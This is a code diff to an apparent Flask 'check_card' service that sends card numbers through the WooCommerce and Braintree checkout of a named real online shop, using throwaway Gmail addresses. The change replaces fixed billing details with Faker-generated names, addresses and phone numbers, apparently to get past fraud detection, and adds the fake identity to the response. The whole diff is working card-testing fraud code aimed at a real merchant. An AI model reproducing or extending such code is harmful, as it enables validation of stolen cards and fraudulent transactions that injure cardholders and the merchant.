@@ -26,8 +26,19 @@ def check_card():
     except ValueError:
         return jsonify({'error': 'Invalid card format. Use: number|month|year|cvv'}), 400
     
+    first_name = fake.first_name()
+    last_name = fake.last_name()
     random5 = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
     email = f"hunterjsidt{random5}@gmail.com"
+    
+    address = fake.street_address()
+    city = fake.city()
+    state = fake.state_abbr()
+    zipcode = fake.zipcode()
+    phone = fake.phone_number()[:10]
+    
+    address_plus = address.replace(' ', '+')
+    city_plus = city.replace(' ', '+')
     
     session = requests.Session()
     
@@ -187,23 +198,25 @@ def check_card():
     url = "https://www.midwestspeakerrepair.com"
     params = {'wc-ajax': "update_order_review"}
     
+    post_data = f"billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zipcode}&billing_phone={phone}&billing_email={email}&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https://www.midwestspeakerrepair.com/product/solen-400-volt-metalized-polypropylene-fast-capacitors/&wc_order_attribution_session_start_time=2026-07-07 12:12:50&wc_order_attribution_session_pages=2&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36&createaccount=1&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&shipping_phone=&order_comments=&shipping_method[0]=wf_shipping_usps:D_PRIORITY_MAIL&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=45.00&wc_braintree_credit_card_payment_nonce=&wc_braintree_device_data={{\"correlation_id\":\"33500a61-c4b7-49cc-996d-649492f2\"}}&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data={{\"correlation_id\":\"33500a61-c4b7-49cc-996d-649492f2\"}}&wc-braintree-paypal-context=shortcode&wc_braintree_paypal_amount=45.00&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&woocommerce-process-checkout-nonce={checkout_nonce}&_wp_http_referer=/?wc-ajax=update_order_review"
+    
     payload = {
         'security': updatenonce,
         'payment_method': "braintree_credit_card",
         'country': "US",
-        'state': "NY",
-        'postcode': "10001",
-        'city': "New+York",
-        'address': "123+Allen+Street",
+        'state': state,
+        'postcode': zipcode,
+        'city': city_plus,
+        'address': address_plus,
         'address_2': "",
         's_country': "US",
-        's_state': "NY",
-        's_postcode': "10001",
-        's_city': "New+York",
-        's_address': "123+Allen+Street",
+        's_state': state,
+        's_postcode': zipcode,
+        's_city': city_plus,
+        's_address': address_plus,
         's_address_2': "",
         'has_full_address': "true",
-        'post_data': "billing_first_name=Erik&billing_last_name=Ragara&billing_company=&billing_country=US&billing_address_1=123 Allen Street&billing_address_2=&billing_city=New York&billing_state=NY&billing_postcode=10001&billing_phone=12012455464&billing_email=mail&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https://www.midwestspeakerrepair.com/product/solen-400-volt-metalized-polypropylene-fast-capacitors/&wc_order_attribution_session_start_time=2026-07-07 12:12:50&wc_order_attribution_session_pages=2&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36&createaccount=1&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&shipping_phone=&order_comments=&shipping_method[0]=wf_shipping_usps:D_PRIORITY_MAIL&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=45.00&wc_braintree_credit_card_payment_nonce=&wc_braintree_device_data={\"correlation_id\":\"33500a61-c4b7-49cc-996d-649492f2\"}&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data={\"correlation_id\":\"33500a61-c4b7-49cc-996d-649492f2\"}&wc-braintree-paypal-context=shortcode&wc_braintree_paypal_amount=45.00&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&woocommerce-process-checkout-nonce=checkout_nonce&_wp_http_referer=/?wc-ajax=update_order_review",
+        'post_data': post_data,
         'shipping_method[0]': "wf_shipping_usps:D_PRIORITY_MAIL"
     }
     
@@ -228,16 +241,16 @@ def check_card():
     params = {'wc-ajax': "checkout"}
     
     payload = {
-        'billing_first_name': "Erik",
-        'billing_last_name': "Ragara",
+        'billing_first_name': first_name,
+        'billing_last_name': last_name,
         'billing_company': "",
         'billing_country': "US",
-        'billing_address_1': "123+Allen+Street",
+        'billing_address_1': address_plus,
         'billing_address_2': "",
-        'billing_city': "New+York",
-        'billing_state': "NY",
-        'billing_postcode': "10001",
-        'billing_phone': "12012455464",
+        'billing_city': city_plus,
+        'billing_state': state,
+        'billing_postcode': zipcode,
+        'billing_phone': phone,
         'billing_email': email,
         'wc_order_attribution_source_type': "typein",
         'wc_order_attribution_referrer': "(none)",
@@ -495,7 +508,13 @@ def check_card():
         'checkout_result': checkout_result,
         'payment_method_result': payment_result,
         'card': cc,
-        'email': email
+        'email': email,
+        'first_name': first_name,
+        'last_name': last_name,
+        'address': address,
+        'city': city,
+        'state': state,
+        'zipcode': zipcode
     }), 200
 
 @app.route('/health', methods=['GET'])
